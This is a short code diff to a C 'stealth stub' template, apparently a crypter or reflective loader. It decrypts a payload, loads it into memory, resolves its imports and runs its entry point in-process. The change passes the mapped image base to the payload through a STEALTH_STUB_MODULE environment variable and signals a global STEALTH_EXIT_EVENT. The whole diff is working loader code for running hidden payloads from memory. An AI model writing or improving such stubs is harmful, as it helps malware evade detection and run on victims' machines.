@@ -256,6 +256,11 @@ DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
         VirtualFree(imageBase, 0, MEM_RELEASE); free(decrypted_payload); tpl_log("[template] resolve_imports failed"); return 1;
     }
 
+    // Pass module handle via environment variable for in-memory stub
+    char env_module[64];
+    snprintf(env_module, sizeof(env_module), "%p", (void*)imageBase);
+    SetEnvironmentVariableA("STEALTH_STUB_MODULE", env_module);
+
     // Execute the payload
     typedef int (WINAPI *WinMain_t)(HINSTANCE, HINSTANCE, LPSTR, int);
     WinMain_t entryPoint = (WinMain_t)((DWORD64)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
@@ -264,7 +269,7 @@ DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
     // explicitly invoke the entrypoint here with SW_SHOW to surface UI payloads (e.g.,
     // message_c.exe) and then signal the exit event so the stub can shut down.
     tpl_log("[template] calling entrypoint at RVA=0x%lx", (unsigned long)ntHeader->OptionalHeader.AddressOfEntryPoint);
-    int result = entryPoint(NULL, NULL, NULL, SW_SHOW);
+    int result = entryPoint((HINSTANCE)imageBase, NULL, NULL, SW_SHOW);
     tpl_log("[template] entrypoint returned %d", result);
 
     HANDLE hEvt = OpenEventA(EVENT_MODIFY_STATE, FALSE, "Global\\STEALTH_EXIT_EVENT");
